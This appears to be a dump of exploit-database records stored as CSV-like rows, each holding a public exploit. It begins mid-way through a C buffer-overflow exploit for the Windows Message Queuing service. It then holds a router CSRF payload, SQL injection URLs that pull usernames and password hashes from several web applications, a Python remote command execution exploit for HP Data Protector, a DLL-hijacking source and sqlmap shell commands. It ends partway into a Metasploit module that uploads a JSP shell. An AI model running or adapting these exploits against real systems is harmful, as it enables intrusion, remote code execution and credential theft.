0x4b, 0xcb, 0xd1, 0x34, 0xe7, 0x4e, 0xd1, 0x24, 0xe7, 0x5e, 0xd1, 0x98, 0x64, 0x7b, 0xea, 0x63, 0x36, 0x7b, 0xd1, 0xee, 0x55, 0x88, 0xea, 0xc3, 0xae, 0x6d, 0x45, 0x30, 0x4b, 0xcb, 0xe8, 0x77, 0xe5, 0x48, 0x7d, 0xb7, 0xdc, 0xb9, 0x2f, 0x49, 0x5d, 0x4a, 0x7d, 0xb1, 0xe7, 0x48, 0x7d, 0xb7, 0xdc, 0xf8, 0xcb, 0xe1, 0xfd, 0x4a, 0x7d, 0xb1, 0xe4, 0x49, 0xd6, 0x32, 0x4b, 0xcd, 0x11, 0x0f, 0x53, 0x64, 0x44, 0x1e, 0xe3, 0xe2, 0x54, 0x32, 0x4b, 0xcd, 0xe4, 0x0d, 0xd0, 0x7b, 0xea, 0x04, 0xd9, 0x94, 0x67, 0x0d, 0xe4, 0x44, 0xab, 0xab, 0x3d, 0xfa, 0xe8, 0x23, 0x3d, 0xff, 0xb3, 0xa7, 0x47, 0xb7, 0x7c, 0x25, 0x99, 0xe3, 0xc0, 0x4b, 0x27, 0x90, 0xf8, 0x5f, 0x1f, 0xb6, 0x29, 0x0f, 0xc6, 0xe3, 0x31, 0x71, 0x4b, 0x68, 0xc6, 0x98, 0x62, 0x46, 0xd5, 0x35, 0xe5, 0x4c, 0xd3, 0x0d, 0xb5, 0x4c, 0xd3, 0x32, 0xe5, 0xe2, 0x52, 0x0f, 0x19, 0xc4, 0x87, 0xa9, 0xe7, 0xe2, 0x54, 0x0d, 0x4b, 0xe2, 0xb5, 0x98, 0x64, 0x96, 0xd5, 0x9b, 0x37, 0xd9, 0xe6, 0x98, 0x62, 0x4f, 0x7d, 0xb7, 0xdc, 0xf2, 0x4c, 0x87, 0xd4, 0x4e, 0x7d, 0xb1, 0x4b, 0xcd, 0x82, 0x67, 0xb4, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41};     char request_2[] = { 0x05, 0x00, 0x00, 0x82, 0x10, 0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x30, 0xa0, 0xb3, 0xfd, 0x5f, 0x06, 0xd1, 0x11, 0xbb, 0x9b, 0x00, 0xa0, 0x24, 0xea, 0x55, 0x25, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };       void usage(char *argv) {    printf("" Usage:   %s -h 127.0.0.1 (Universal exploit)\n"",argv);    printf(""          %s -h host [-p port]\n"",argv);    printf("" Targets:\n"");    exit(1);    }       /************* TCP connect *************************/   void Disconnect(SOCKET s);     // ripped from isno int Make_Connection(char *address,int port,int timeout) {     struct sockaddr_in target;     SOCKET s;     int i;     DWORD bf;     fd_set wd;     struct timeval tv;       s = socket(AF_INET,SOCK_STREAM,0);     if(s<0)         return -1;       target.sin_family = AF_INET;     target.sin_addr.s_addr = inet_addr(address);     if(target.sin_addr.s_addr==0)     {         closesocket(s);         return -2;     }     target.sin_port = htons((short)port);     bf = 1;     ioctlsocket(s,FIONBIO,&bf);     tv.tv_sec = timeout;     tv.tv_usec = 0;     FD_ZERO(&wd);     FD_SET(s,&wd);     connect(s,(struct sockaddr *)&target,sizeof(target));     if((i=select(s+1,0,&wd,0,&tv))==(-1))     {         closesocket(s);         return -3;     }     if(i==0)     {         closesocket(s);         return -4;     }     i = sizeof(int);     getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);     if((bf!=0)||(i!=sizeof(int)))     {         closesocket(s);         return -5;     }     ioctlsocket(s,FIONBIO,&bf);     return s; }     void Disconnect(SOCKET s) {          closesocket(s);          WSACleanup(); }   /****************************************************/       int main(int argc, char * argv[]){      unsigned char * target = NULL;    int port = 2103;    int i;      int  ret;    char buffer[6000] = {0};    SOCKET  s;    WSADATA WSAData;      printf(""--------------------------------------------------------------------------\n"");    printf(""-== Windows Message Queuing Service RPC BOF Exploit (MS07-065) ==-\n"");    printf(""-== code by axis@ph4nt0m ==-\n"");    printf(""-== Http://www.ph4nt0m.org ==-\n"");    printf(""-== Tested against Windows 2000 server SP4 ==-\n"");    printf(""--------------------------------------------------------------------------\n\n"");         if (argc==1) usage(argv[0]); //Handle parameters      for(i=1;i<argc;i++) {       if ( (argv[i][0]=='-') ) {          switch (argv[i][1]) {          case 'h':             target=(unsigned char *)argv[i+1];             break;          case 'p':             if (strcmp(argv[i+1],""2103"")==0) {                printf(""[+] Attacking default port 2103\n"");             } else {                port=atoi(argv[i+1]);             }             break;                      default:             printf(""[-] Invalid argument: %s\n"",argv[i]);             usage(argv[0]);             break;          }          i++;                        } else usage(argv[0]);           }   /********************** attack payload ***************************/                     if(WSAStartup (MAKEWORD(1,1), &WSAData) != 0)                     {             fprintf(stderr, ""[-] WSAStartup failed.\n"");             WSACleanup();             exit(1);                     }                         //Sleep(1200);              s = Make_Connection((char *)target, port, 10);          if(s<0)                     {             fprintf(stderr, ""[-] connect err.\n"");             exit(1);                     }                      //Send our evil Payload                       printf(""[*]Sending our Payload, Good Luck! ^_^\n"");                      printf(""[*]Sending RPC Bind String!\n"");                    send(s, bind_str, sizeof(bind_str), 0);                      Sleep(1000);                                       printf(""[*]Sending RPC Request Now!\n"");                    memset(buffer, '\x41', sizeof(buffer));  // fil the buffer to trigger seh     send(s, request_1, sizeof(request_1), 0);                    send(s, buffer, 5104, 0);   // fil the buffer to trigger seh                    send(s, request_2, sizeof(request_2), 0);                              Sleep(100);                memset(buffer, 0, sizeof(buffer));              ret = recv(s, buffer, sizeof(buffer)-1, 0);                    //printf(""recv: %s\n"", buffer);                      Disconnect(s);                      return 0; }  // milw0rm.com [2007-12-18]",.ph4nt0m.,1
33803,"ZTE WXV10 W300 - Multiple Vulnerabilities # Exploit Title: 	ZTE WXV10 W300 Multiple Vulnerabilities # Date: 			17-05-2014 # Server Version: 	RomPager/4.07 UPnP/1.0 # Tested Routers:   ZTE ZXV10 W300 # Firmware: 		W300V1.0.0a_ZRD_LK # ADSL Firmware: 	FwVer:3.11.2.175_TC3086 HwVer:T14.F7_5.0 # Tested on: 		Kali Linux x86_64 # Exploit Author: 	Osanda Malith Jayathissa (@OsandaMalith) # Original write-up:https://osandamalith.wordpress.com/2014/06/10/zte-and-tp-link-rompager-dos/   #1| Default Password Being Used (CVE-2014-4018) ------------------------------------------------ In ZTE routers the username is a constant which is ""admin"" and the password by default is ""admin""  #2| ROM-0 Backup File Disclosure (CVE-2014-4019) ------------------------------------------------- The rom-0 backup file contains sensitive information such as the router password.  There is a disclosure in which anyone can download that file without any authentication by a simple GET request.  POC: http://192.168.1.1/rom-0  You can find the router password using my rom-0 configuration decompressor.   http://packetstormsecurity.com/files/127049/ZTE-TP-Link-ZynOS-Huawei-rom-0-Configuration-Decompressor.html  #3| PPPoE/PPPoA Password Disclosure in tc2wanfun.js (CVE-2014-4154) --------------------------------------------------------------------- If you look at the frame source in the ""Internet"" tab under the ""Interface Setup"" you can see this doLoad function in line 542 which fetches the password and displays it there. The frame URI is /basic/home_wan.htm.  function doLoad() { 	var value = document.forms[0].wanTypeRadio[2].checked; 	doEnable(); 	QosCheck(); 	WANChkIdleTimeT(); 	if (value) 	pppStaticCheck(); 	LockWhenPVC0(); 	LockPVC(); 	if(document.forms[0].wan_PPPPassword != null) 	{ 		document.forms[0].wan_PPPPassword.value = pwdppp; 	} }  The ""pwdpp"" is loaded from an external file which you can see at the bottom of the page. <script language=""javascript"" src=""/basic/tc2wanfun.js""></script> Once the user authenticates the router till another successful restart the password is written in that external JS file.  POC: http://192.168.1.1/basic/tc2wanfun.js  #4| Admin Password Manipulation CSRF (CVE-2014-4155) ----------------------------------------------------- You can change the password to blank by requesting /Forms/tools_admin_1 with a GET requesting containing HTTP basic authentication. POC: <iframe src=""http://192.168.1.1/Forms/tools_admin_1"" width=""0"" height=""0""></iframe> If you send something like above to the victim, he will be prompted for the login and once he enter his credentials, his password will be immediately changed to a blank password. Ofcourse since there is no XSRF token in the request you change the password as you wish. POC: <html>   <body>     <form name=""exploit"" action=""http://192.168.1.1/Forms/tools_admin_1"" method=""POST"">       <input type=""hidden"" name=""uiViewTools_Password"" value=""your_passwd"" />       <input type=""hidden"" name=""uiViewTools_PasswordConfirm"" value=""your_passwd"" />       <script>document.exploit.submit(); </script>     </form>   </body> </html>  #5| Denial of Service ----------------------- You can see my previous post about this vulnerability and the exploit.  https://osandamalith.wordpress.com/2014/06/10/zte-and-tp-link-rompager-dos/ http://www.osvdb.org/show/osvdb/108076 http://packetstormsecurity.com/files/127076/ZTE-TP-Link-RomPager-Denial-Of-Service.html http://www.exploit-db.com/exploits/33737",ZTE,1
14217,"WikiWebHelp 0.28 - SQL Injection # Version: v0.28 (Possible all versions) # Vendor: Richard Bondi - http://wikiwebhelp.org # Download: http://wikiwebhelp.org/release/wwh-0.2.8.zip  # Description: ""The goal of this project is to create a help application that is editable by the community. Standard wiki systems are great for many applications. The help application and the wiki is an ideal marriage. The problem with the standard wiki in a help application is that it leaves you jumping around and does not have the smooth flow that we have with a desktop chm type viewer. This project aims to return that smooth flow to your wiki based help application.""  # Credit: Vulnerability founded by Canberk BOLAT at ADEO Security Labs         - Mail: security[AT]adeo.com.tr         - Web: http://security.adeo.com.tr  # Vulnerability: In the file named as getpage.php user input don't used in single quotes.  handlers/getpage.php ---[snip]--- 4	if($page==null) $page = $_GET['id'];  5	  6	$sql = ""SELECT * FROM page INNER JOIN node ON node.node_id=page.node_id WHERE node.node_id=$page""; ---[snip]---  Its successfully exploitable. Please see # PoC section.  # PoC: Request: http://server/handlers/getpage.php?id=9999999+UNION+SELECT+1,CONCAT_WS(0x3a,user_name,password),3,4,5,6,7+FROM+user+LIMIT+1  Response: admin:21232f297a57a5a743894a0e4a801fc3",WikiWebHelp,0
8707,"my-colex 1.4.2 - Authentication Bypass / SQL Injection / Cross-Site Scripting *********************************************************************************************** *********************************************************************************************** **	       										     ** **  											     ** **     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    ** **     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    ** ** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    ** **  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\  **==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>-- **  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/     [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    ** **							                                     ** **    											     ** **                          Â¡VIVA SPAIN!...Â¡GANAREMOS EL MUNDIAL!...o.O                      ** **					Â¡PROUD TO BE SPANISH!				     ** **											     ** *********************************************************************************************** ***********************************************************************************************  ---------------------------------------------------------------------------------------------- |       	   	        MULTIPLE REMOTE VULNERABILITIES	  	          	     | |--------------------------------------------------------------------------------------------| |                         	|        my-colex 1.4.2        |		 	     | |  CMS INFORMATION:		 ------------------------------			             | |										             | |-->WEB: http://www.collector.ch/drupal5/index.php    		     			     | |-->DOWNLOAD: http://www.collector.ch/drupal5/?q=node/11          	                     | |-->DEMO: http://www.collector.ch/drupal5/?q=node/10					     | |-->CATEGORY: Management								     | |-->DESCRIPTION: myColex is a complete museum management and collection documentation        | |		system with longterm archiving capabilities based on Apache/PHP and mySQL... | |-->RELEASED: 2009-03-24								     | |											     | |  CMS VULNERABILITY:									     | |											     | |-->TESTED ON: firefox 3						                     | |-->DORK: N/A									             | |-->CATEGORY: AUTH BYPASS/ SQL INJECTION / XSS					             | |-->AFFECT VERSION: 1.4.2 (maybe <= ?)				 		     	     | |-->Discovered Bug date: 2009-05-06							     | |-->Reported Bug date: 2009-05-06							     | |-->Fixed bug date: 2009-05-07								     | |-->Info patch: http://www.collector.ch/drupal5/?q=forum/15			             | |-->Author: YEnH4ckEr									     | |-->mail: y3nh4ck3r[at]gmail[dot]com							     | |-->WEB/BLOG: N/A									     | |-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       | |-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     | ----------------------------------------------------------------------------------------------   ################# /////////////////  INTRODUCTION:  ///////////////// #################   This app is completely vulnerable to sql code injection.  Except auth bypass we can not exploit sql injection without a register user.   ######################### ////////////////////////  AUTH BYPASS (SQLi):  //////////////////////// #########################   <<<<---------++++++++++++++ Condition: magic quotes=OFF +++++++++++++++++--------->>>>   ---------- EXPLOIT: ----------  Name=' or 1=1#  password=123456 (over six characters)  Then, going to http://[HOST]/[HOME_PATH]/modules/admuser.php?Modus=Find  We got admin credentials...  Password is encrypted with MySQLSHA-1.   ######################### ////////////////////////  SQL INJECTION (SQLi):  //////////////////////// #########################   <<<<---------++++++++++++++ Condition: Be a register user +++++++++++++++++--------->>>>  <<<<---------++++++++++++++ Condition: magic quotes = ON/OFF +++++++++++++++++--------->>>>   ------------------ PROOF OF CONCEPT: ------------------   Some examples:  http://[HOST]/[HOME_PATH]/modules/kategorie.php?Modus=Detail&ID=1+and+0+union+all+select+1,version(),database(),user(),version()%23  http://[HOST]/[HOME_PATH]/modules/medium.php?Modus=Detail&ID=23+and+0+UNION+ALL+SELECT+1,version(),database(),version(),user(),database(),7/*  http://[HOST]/[HOME_PATH]/modules/person.php?Modus=Detail&ID=2+AND+0+UNION+ALL+SELECT+1,2,3,4,version(),6,user(),version(),database(),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36/*  http://[HOST]/[HOME_PATH]/modules/schlagwort.php?Modus=Detail&ID=1+AND+0+UNION+ALL+SELECT+1,version(),database(),current_user(),user(),6/*  There are more...  Return: user, version, ...   ---------- EXPLOITS: ----------   http://[HOST]/[HOME_PATH]/modules/kategorie.php?Modus=Detail&ID=1+and+0+union+all+select+1,SuUser,SuEmail,SuPwd,SuSysAut+FROM+sysuser+WHERE+SuID=1%23  http://[HOST]/[HOME_PATH]/modules/medium.php?Modus=Detail&ID=23+and+0+UNION+ALL+SELECT+1,2,3,4,SuUser,SuPwd,6+FROM+sysuser+WHERE+SuID=1/*  Return: username/password (id=1)   ########################### ///////////////////////////  CROSS SITE SCRIPTING (XSS):  /////////////////////////// ###########################   XSS is possible where you like :P  Some examples:   http://[HOST]/[HOME_PATH]/modules/kalender.php?month=5&year=2009""><script>alert('y3nh4ck3r+was+here!')</script>  http://[HOST]/[HOME_PATH]/modules/ereignis.php?Modus=List&Page=1""><script>alert('y3nh4ck3r+was+here!')</script>&Order=ErAnfangsdatum  http://[HOST]/[HOME_PATH]/modules/kategorie.php?Modus=Search&Kontext=objekt""><script>alert('y3nh4ck3r+was+here!')</script>  http://[HOST]/[HOME_PATH]/modules/image.php?image=<script>alert('y3nh4ck3r+was+here!')</script>   Of course there are more...    <<<-----------------------------EOF---------------------------------->>>ENJOY IT!    ####################################################################### ####################################################################### ##*******************************************************************## ##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ## ##*******************************************************************## ##-------------------------------------------------------------------## ##*******************************************************************## ## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!## ##*******************************************************************## ####################################################################### #######################################################################  # milw0rm.com [2009-05-15]",.collector.chd,1
39858,"HP Data Protector A.09.00 - Arbitrary Command Execution #!/usr/bin/python # # Exploit Title: Data Protector Encrypted Communications # Date: 26-05-2016 # Exploit Author: Ian Lovering # Vendor Homepage: http://www8.hp.com/uk/en/software-solutions/data-protector-backup-recovery-software/ # Version: A.09.00 and earlier # Tested on: Windows Server 2008 # CVE : CVE-2016-2004 #  #   This proof of concept demonstrates that enabling encrypted control communication on #   Data Protector agents does not provide any additional security. #   As is provides no authentication it is not a viable workaround to prevent the #   exploitation of well known Data Protector issues such as cve-2014-2623 # #   This exploit establishes and unauthenticated encrypted communication channel to  #   a Data Protector Agent and uses a well known unencrypted Data Protector vulnerability #   to run arbitrary commands on the target.  #   Tested on Kali Linux 2 with python 2.7.9 #   Tested against Data Protector A.09.00 (Internal Build version 88) with encrypted control #   communication enabled. #   All other Data Protector settings are default. #   Tested against Data Protector agent running on Windows 2008 R2 #   Also tested against Data Protector A.07 # #   encrypted-dataprotector.py -e <ipaddress> # #   By default runs ipconfig on the target.  #   Can take a little while to return. Have patience ;) # #   CVE-2016-2004  import socket import ssl import time import struct import argparse   parser = argparse.ArgumentParser(prog='test-encrypt.py') parser.add_argument('-e', '--encrypt', dest='encrypt', action='store_true') parser.add_argument('-p', '--port', type=int) parser.add_argument('-c', '--command') parser.add_argument('ipaddress') parser.set_defaults(encrypt=False,port=5555) args = parser.parse_args()  HOST = args.ipaddress PORT = args.port  command = 'ipconfig'  if args.command:     command = args.command  # initialise data initdata = (""\x00\x00\x00\x48\xff\xfe\x32\x00\x36\x00\x37\x00\x00\x00\x20\x00""         ""\x31\x00\x30\x00\x00\x00\x20\x00\x31\x00\x30\x00\x30\x00\x00\x00""         ""\x20\x00\x39\x00\x30\x00\x30\x00\x00\x00\x20\x00\x38\x00\x38\x00""         ""\x00\x00\x20\x00\x6f\x00\x6d\x00\x6e\x00\x69\x00\x64\x00\x6c\x00""         ""\x63\x00\x00\x00\x20\x00\x34\x00\x00\x00\x00\x00"")  OFFSET = 46 command = command.replace(""\\"", ""\\\\"") command = command.replace(""\'"", ""\\\'"") command_length = struct.pack("">I"",OFFSET + len(command)) payload = command_length         +\     ""\x32\x00\x01\x01\x01\x01\x01\x01"" +\     ""\x00\x01\x00\x01\x00\x01\x00\x01"" +\     ""\x01\x00\x20\x32\x38\x00\x5c\x70"" +\     ""\x65\x72\x6c\x2e\x65\x78\x65\x00"" +\     ""\x20\x2d\x65\x73\x79\x73\x74\x65"" +\     ""\x6d('%s')\x00"" % command  def get_data(sock):     response = ''     recv_len =1          while recv_len:         data = sock.recv(4096)         recv_len = len(data)         response += data         if recv_len < 4096:             break          return response  def get_dp_response(sock):      print ""===== Response =====""     print      while True:          # Get information about response         packed_length = sock.recv(4)         if not packed_length:              break         n = struct.unpack("">I"", packed_length)[0]         tmpresponse = sock.recv(n)         tmpresponse = tmpresponse.replace(""\n"", """")         tmpresponse = tmpresponse.replace(""\x00"", """")         tmpresponse = tmpresponse.replace(""\xff\xfe\x39\x20"", """")         if tmpresponse.upper().find(""*RETVAL*"") != -1:             break         else:             print tmpresponse      print     print ""===== End =====""     print   client = socket.socket( socket.AF_INET, socket.SOCK_STREAM )  if args.encrypt:     context = ssl.create_default_context()     context.check_hostname = False     context.verify_mode = ssl.CERT_NONE     context.set_ciphers('ALL')  try:     client.connect(( HOST, PORT ))     print ""Connected""       if args.encrypt:         # send data protector init string         client.send(initdata)         response = get_data(client)          # setup tls         client = context.wrap_socket(client)         print ""Encryption Enabled""          # send payload     client.send(payload)     print ""Sent Payload""     print """"     print ""===== Command =====""     print     print command     print     get_dp_response(client)      client.close()  except Exception as e:     print '[*] Exception. Exiting.'     print e     client.close()",8.hp.,1
4810,"CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection ------------------------------------------------------------------------- CMS Made Simple <= 1.2.2 (TinyMCE module) - Remote SQL Injection Advisory -------------------------------------------------------------------------  author...: EgiX mail.....: n0b0d13s[at]gmail[dot]com  link.....: http://www.cmsmadesimple.org/ dork.....: ""This site is powered by CMS Made Simple version 1.2.2""  [-] Vulnerable code in /modules/TinyMCE/content_css.php :   26.	$templateid = '';  27.	if (isset($_GET[""templateid""])) $templateid = $_GET[""templateid""]; <==  28.  29.	$mediatype = '';  30.	if (isset($_GET[""mediatype""])) $mediatype = $_GET[""mediatype""];  31.  32.	$name = '';  33.	if (isset($_GET['name'])) $name = $_GET['name'];   64.		if ($name != '')  65.			$sql=""SELECT css_text, css_name FROM "".$config['db_prefix'].""css WHERE css_name = '"" . mysql_real_escape_string($name, $db) . ""'"";  66.		else  67.			$sql=""SELECT c.css_text, c.css_id, c.css_name FROM "".$config['db_prefix'].""css c,"".$config['db_prefix'].""css_assoc ac WHERE ac.assoc_type='template' AND ac.assoc_to_id = $templateid  (...) <==  68.		$result=mysql_query($sql);  69.	//		echo $sql;  70.		while ($result && $row = mysql_fetch_assoc($result))  71.		{  72.			$css .= ""/* Start of CMSMS style sheet '{$row['css_name']}' */\n{$row['css_text']}\n/* End of '{$row['css_name']}' */\n"";  73.		}    $_GET[""templateid""] isn't properly checked at line 27, this results in a sql injection at line 67   [*] An attacker can break database through browser! P.o.C. :  http://[host]/[path]/modules/TinyMCE/content_css.php?templateid=-1/**/UNION/**/SELECT/**/username,1,password/**/FROM/**/{prefix}_users/*  # milw0rm.com [2007-12-30]",cmsmadesimple,1
5925,"ShareCMS 0.1 - Multiple SQL Injections ==============================================================   ShareCMS 0.1 Multiple Remote SQL Injection Vulnerabilities ==============================================================     ,--^----------,--------,-----,-------^--,   | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..   `+---------------------------^----------|     `\_,-------, _________________________|       / XXXXXX /`|     /      / XXXXXX /  `\   /     / XXXXXX /\______(    / XXXXXX /              / XXXXXX /  (________(                `------'   AUTHOR : CWH Underground DATE   : 24 June 2008 SITE   : www.citec.us   #####################################################  APPLICATION : ShareCMS   VERSION     : 0.1 Beta  VENDOR      : N/A  DOWNLOAD    : http://downloads.sourceforge.net/sharecms #####################################################  --- Remote SQL Injection ---  ----------  Exploits ----------  [+] http://[Target]/[sharecms_path]/event_info.php?eventID[SQL Injection] [+] http://[Target]/[sharecms_path]/list_user.php?userID=[SQL Injection]  --------------  POC Exploits --------------  [+] http://192.168.24.25/sharecms/event_info.php?eventID=-9999/**/UNION/**/SELECT/**/1,2,3,username,5,6,7,8,9,10,11,12,password/**/FROM/**/user-- [+] http://192.168.24.25/sharecms/list_user.php?userID=-9999/**/UNION/**/SELECT/**/1,2,3,4,5,6,concat(username,0x3a,password),8,9,10,11/**/FROM/**/user--   ################################################################## # Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  # ##################################################################  # milw0rm.com [2008-06-24]",.citec.,1
14747,"TeamMate Audit Management Software Suite - 'mfc71enu.dll' DLL Hijacking /* # Greetz to :b0nd, Fbih2s,r45c4l,Charles ,j4ckh4x0r, punter,eberly, Charles, Dinesh Arora , Anirban ,Ganesha, Dinesh Arora # Site : www.beenuarora.com  Exploit Title: TeamMate Audit Management Software Suite DLL Hijacking Date: 25/08/2010 Author: Beenu Arora Tested on: Windows XP SP3 , TeamMate Audit Management Software Suite v8.0 patch 2 Vulnerable extensions: tmx  Compile and rename to mfc71enu.dll, create a file in the same dir with one of the following extensions: .tmx */  #include <windows.h> #define DLLIMPORT __declspec (dllexport)  DLLIMPORT void hook_startup() { evil(); }  int evil() {   WinExec(""calc"", 0);   exit(0);   return 0; }  // POC: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/14747.zip",wolterskluwer,1
46377,"WordPress Plugin Booking Calendar 8.4.3 - (Authenticated) SQL Injection # Exploit Title: Wordpress Booking Calendar v8.4.3 - Authenticated SQL Injection Vulnerability # Date: 2018-12-28 # Exploit Author: B0UG # Vendor Homepage: https://wpbookingcalendar.com/ # Software Link: https://wordpress.org/plugins/booking/ # Version: Tested on version 8.4.3 (older versions may also be affected) # Tested on: WordPress # Category : Webapps # CVE: CVE-2018-20556  #I. VULNERABILITY  Authenticated SQL Injection   #II. BACKGROUND 'Booking Calendar' WordPress plugin developed by oplugins is a booking system which allows website visitors to check the availability of services and make reservations.  #III. DESCRIPTION An authenticated SQL Injection vulnerability in the 'Booking Calendar' WordPress plugin allows an attacker to read arbitrary data from the database.   #IV. PROOF OF CONCEPT 1) Access WordPress control panel. 2) Navigate to the Booking Calendar plugin page. 3) Set up Burp Suite to capture the traffic. 4) Select one of the booking entries and click on the 'Trash Can' button to delete the entry. 5) Within Burp Suite, analyse the POST request and idenitfy the parameter 'booking_id'. 6) The 'booking_id' parameter is vulnerable to the following different types of SQL injection:  • Boolean based blind injection • Error based injection • Time based injection  7) We can perform a time based SQL injection by appending   ) AND SLEEP(100) AND (1=1   after the ID value in the parameter as shown below. action=TRASH_RESTORE&booking_id=573) AND SLEEP(100) AND (1=1&is_send_emeils=1&denyreason=&user_id=1&wpdev_active_locale=en_US&is_trash=1&wpbc_nonce=99c5ffaa67  Obtaining a shell using sqlmap ----------------------- • Obtain a SQL Shell Sqlmap –r post-request.txt –p booking_id --sql-shell  • Obtain a Linux Shell Sqlmap –r post-request.txt –p booking_id --os-shell  • Obtain a Windows Command Prompt Sqlmap –r post-request.txt –p booking_id --os-cmd  #V. IMPACT The vulnerability allows an attacker to read arbitrary data from the database. It is possible to get a remote shell from this vulnerability.   #VI. SYSTEMS AFFECTED WordPress websites running 'Booking Calendar' WordPress plugin version 8.4.3 (older versions may also be affected).   #VII. REMEDIATION Uninstall the plugin until the vulnerability has been fixed by the developer.  #VIII. DISCLOSURE TIMELINE #December 28, 2018 1: Vulnerability identified. #December 28, 2018 2: Informed developer of the vulnerability. #February 14, 2019 3: No communication received back from the developer.",WordPress,1
39643,"Apache Jetspeed - Arbitrary File Upload (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote    Rank = ManualRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::FileDropper    def initialize(info = {})     super(update_info(info,       'Name'           => 'Apache Jetspeed Arbitrary File Upload',       'Description'    => %q{         This module exploits the unsecured User Manager REST API and a ZIP file         path traversal in Apache Jetspeed-2, versions 2.3.0 and unknown earlier         versions, to upload and execute a shell.          Note: this exploit will create, use, and then delete a new admin user.          Warning: in testing, exploiting the file upload clobbered the web         interface beyond repair. No workaround has been found yet. Use this         module at your own risk. No check will be implemented.       },       'Author'         => [         'Andreas Lindh', # Vulnerability discovery         'wvu'            # Metasploit module       ],       'References'     => [         ['CVE', '2016-0710'],         ['CVE', '2016-0709'],         ['URL', 'http://haxx.ml/post/140552592371/remote-code-execution-in-apache-jetspeed-230-and'],         ['URL', 'https://portals.apache.org/jetspeed-2/security-reports.html#CVE-2016-0709'],         ['URL', 'https://portals.apache.org/jetspeed-2/security-reports.html#CVE-2016-0710']       ],       'DisclosureDate' => 'Mar 6 2016',       'License'        => MSF_LICENSE,       'Platform'       => ['linux', 'win'],       'Arch'           => ARCH_JAVA,       'Privileged'     => false,       'Targets'        => [         ['Apache Jetspeed <= 2.3.0 (Linux)',   'Platform' => 'linux'],         ['Apache Jetspeed <= 2.3.0 (Windows)', 'Platform' => 'win']       ],       'DefaultTarget'  => 0     ))      register_options([       Opt::RPORT(8080)     ])   end    def print_status(msg='')     super(""#{peer} - #{msg}"")   end    def print_warning(msg='')     super(""#{peer} - #{msg}"")   end    def exploit     print_status(""Creating admin user: #{username}:#{password}"")     create_admin_user     # This was originally a typo... but we're having so much fun!     print_status('Kenny Loggins in')     kenny_loggins     print_warning('You have entered the Danger Zone')     print_status(""Uploading payload ZIP: #{zip_filename}"")     upload_payload_zip     print_status(""Executing JSP shell: /jetspeed/#{jsp_filename}"")     exec_jsp_shell   end    def cleanup     print_status(""Deleting user: #{username}"")     delete_user     super   end    #   # Exploit methods   #    def create_admin_user     send_request_cgi(       'method'    => 'POST',       